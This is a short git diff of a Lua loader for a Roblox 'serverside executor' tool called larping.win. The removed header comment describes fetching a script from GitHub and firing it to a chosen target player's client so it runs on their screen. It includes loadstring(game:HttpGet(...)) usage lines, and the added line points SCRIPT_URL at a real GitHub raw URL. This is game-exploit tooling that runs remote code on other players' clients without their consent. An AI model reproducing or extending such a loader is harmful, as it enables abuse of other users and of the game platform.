@@ -1,23 +1,4 @@
---[[
-    larping.win | serverside — LOADER
-    
-    This loader runs SERVER-SIDE (in your SS executor).
-    It fetches the main script from GitHub via HttpService,
-    then fires it to the TARGET PLAYER's client through a
-    temporary RemoteEvent so it executes with full client authority
-    on their screen — not yours.
-
-    Usage (run this in your serverside executor):
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/larping_win_loader.lua"))()("TargetUsername")
-
-    Or set TARGET_USER below and just loadstring the loader with no args:
-        loadstring(game:HttpGet("...loader url..."))()
-
-    Host larping_win_serverside.lua on GitHub and paste the raw URL in SCRIPT_URL.
---]]
-
--- ====================== CONFIG ======================
-local SCRIPT_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/larping_win_serverside.lua"
+local SCRIPT_URL = "https://raw.githubusercontent.com/TacoDark/LarpingWinSiriusServerside/refs/heads/main/larping_win_serverside.lua"
 
 -- Timeout (seconds) waiting for the client to acknowledge receipt
 local REMOTE_TIMEOUT = 10
